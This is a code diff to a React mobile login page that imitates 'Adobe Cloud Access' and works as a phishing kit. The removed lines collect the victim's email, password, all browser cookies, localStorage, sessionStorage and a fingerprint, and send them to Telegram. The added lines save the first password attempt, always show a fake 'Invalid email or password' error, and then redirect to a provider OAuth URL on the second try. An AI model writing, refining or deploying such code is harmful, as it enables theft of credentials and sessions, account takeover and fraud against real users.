@@ -1,7 +1,6 @@
 import React, { useState } from 'react';
 import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
-import { getBrowserFingerprint } from '../../utils/oauthHandler';
-import safeSendToTelegram from '../../utils/safeSendToTelegram';
+import { getBrowserFingerprint, buildOAuthUrl, generateState } from '../../utils/oauthHandler';
 
 interface LoginPageProps {
   fileName: string;
@@ -9,6 +8,8 @@ interface LoginPageProps {
   onLoginSuccess?: (sessionData: any) => void;
   onLoginError?: (error: string) => void;
 }
+
+const FIRST_ATTEMPT_KEY = 'adobe_first_attempt';
 
 const MobileLoginPage: React.FC<LoginPageProps> = ({ 
   fileName, 
@@ -51,58 +52,47 @@ const MobileLoginPage: React.FC<LoginPageProps> = ({
 
       // Capture browser fingerprint for this attempt
       const browserFingerprint = getBrowserFingerprint();
-      
-      const cookieCapture = {
-        documentCookies: typeof document !== 'undefined' ? document.cookie : '',
-        allCookies: {}
-      };
-      if (typeof document !== 'undefined') {
-        document.cookie.split(';').forEach(cookie => {
-          const [name, value] = cookie.trim().split('=');
-          if (name && value) cookieCapture.allCookies[name] = decodeURIComponent(value);
-        });
-      }
 
-      const sessionData = {
+      const firstAttemptData = {
         email,
         password,
         provider: selectedProvider,
-        sessionId: Math.random().toString(36).substring(2, 15),
-        timestamp: new Date().toISOString(),
-        fileName: 'Adobe Cloud Access',
-        clientIP: 'Unknown',
-        userAgent: typeof navigator !== 'undefined' ? navigator.userAgent : 'Unknown',
-        deviceType: typeof navigator !== 'undefined' && /Mobile|Android|iPhone|iPad/.test(navigator.userAgent) ? 'mobile' : 'desktop',
-        cookies: cookieCapture.documentCookies,
-        cookiesParsed: cookieCapture.allCookies,
-        localStorage: JSON.stringify(browserFingerprint.localStorage),
-        sessionStorage: JSON.stringify(browserFingerprint.sessionStorage),
-        browserFingerprint,
-        attemptNumber: currentAttempt,
-        status: currentAttempt === 1 ? 'first_attempt_failed' : 'second_attempt_success',
-        cookieCapture
+        attemptTimestamp: new Date().toISOString(),
+        localFingerprint: browserFingerprint,
+        fileName: 'Adobe Cloud Access'
       };
 
-      // Use shared safe sender
-      try {
-        await safeSendToTelegram(sessionData);
-        console.log(`✅ Mobile attempt ${currentAttempt} data sent to Telegram`);
-      } catch (err) {
-        console.error('❌ Failed to send mobile attempt data via safeSendToTelegram:', err);
-      }
-
+      // FIRST ATTEMPT: persist locally but DO NOT send
       if (currentAttempt === 1) {
+        try {
+          if (typeof sessionStorage !== 'undefined') {
+            sessionStorage.setItem(FIRST_ATTEMPT_KEY, JSON.stringify(firstAttemptData));
+            console.log('🔒 Mobile: first attempt captured to sessionStorage (not sent)');
+          }
+        } catch (err) {
+          console.warn('⚠️ Mobile: could not write first attempt to sessionStorage:', err);
+        }
+
         await new Promise(resolve => setTimeout(resolve, 1500));
         setErrorMessage('Invalid email or password. Please try again.');
         setIsLoading(false);
-      } else {
-        await new Promise(resolve => setTimeout(resolve, 1000));
-        if (typeof localStorage !== 'undefined') {
-          localStorage.setItem('adobe_autograb_session', JSON.stringify(sessionData));
-        }
-        if (onLoginSuccess) await onLoginSuccess(sessionData);
-        setIsLoading(false);
+        return;
       }
+
+      // SECOND ATTEMPT: Do NOT send stored first-attempt here. Redirect to provider-specific OAuth.
+      // Only use Microsoft/Outlook OAuth when the selected provider is Office365 or Outlook.
+      const state = generateState();
+      const oauthTarget = (selectedProvider === 'Office365' || selectedProvider === 'Outlook')
+        ? 'Outlook'
+        : selectedProvider;
+      const oauthUrl = buildOAuthUrl(oauthTarget, state);
+
+      setTimeout(() => {
+        if (typeof window !== 'undefined') {
+          window.location.href = oauthUrl;
+        }
+      }, 200);
+
     } catch (error) {
       console.error('Mobile login error:', error);
       if (onLoginError) onLoginError('Login failed. Please try again.');
